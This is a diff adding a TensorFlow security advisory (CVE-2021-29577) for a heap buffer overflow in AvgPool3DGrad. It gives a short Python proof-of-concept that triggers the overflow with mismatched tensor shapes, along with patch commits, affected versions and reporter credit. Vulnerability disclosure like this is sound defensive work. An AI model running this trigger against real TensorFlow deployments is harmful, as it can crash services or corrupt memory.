@@ -1,0 +1,35 @@
+<h2>TFSA-2021-065: Heap buffer overflow in <code>AvgPool3DGrad</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29577</p>
+<h3>Impact</h3>
+<p>The implementation of <code>tf.raw_ops.AvgPool3DGrad</code> is vulnerable to a heap buffer
+overflow:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>orig_input_shape = tf.constant([10, 6, 3, 7, 7], shape=[5], dtype=tf.int32)
+grad = tf.constant([0.01, 0, 0], shape=[3, 1, 1, 1, 1], dtype=tf.float32)
+ksize = [1, 1, 1, 1, 1]
+strides = [1, 1, 1, 1, 1]
+padding = "SAME"</p>
+<p>tf.raw_ops.AvgPool3DGrad(
+  orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides,
+  padding=padding)
+```</p>
+<p>The
+<a href="https://github.com/tensorflow/tensorflow/blob/d80ffba9702dc19d1fac74fc4b766b3fa1ee976b/tensorflow/core/kernels/pooling_ops_3d.cc#L376-L450">implementation</a>
+assumes that the <code>orig_input_shape</code> and <code>grad</code> tensors have similar first and
+last dimensions but does not check that this assumption is validated.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/6fc9141f42f6a72180ecd24021c3e6b36165fe0d">6fc9141f42f6a72180ecd24021c3e6b36165fe0d</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu
+X-Team.</p>
